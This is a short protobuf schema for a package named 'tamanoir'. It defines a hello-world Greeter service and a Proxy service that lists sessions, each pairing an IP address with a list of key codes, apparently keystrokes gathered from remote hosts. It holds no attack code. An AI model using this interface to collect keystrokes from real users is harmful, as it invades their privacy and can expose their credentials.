syntax = "proto3";

package tamanoir;

service Greeter {
  rpc SayHello (HelloRequest) returns (HelloReply) {}
}

message HelloRequest {
  string name = 1;
}


message HelloReply {
  string message = 1;
}

message NoArgs {}



message SessionsResponse {
  repeated SessionResponse sessions = 1;
}


message SessionResponse {
  string ip =1;
  repeated uint32 key_codes=2; 

}

service Proxy {
  rpc GetSessions (NoArgs) returns (SessionsResponse) {}
}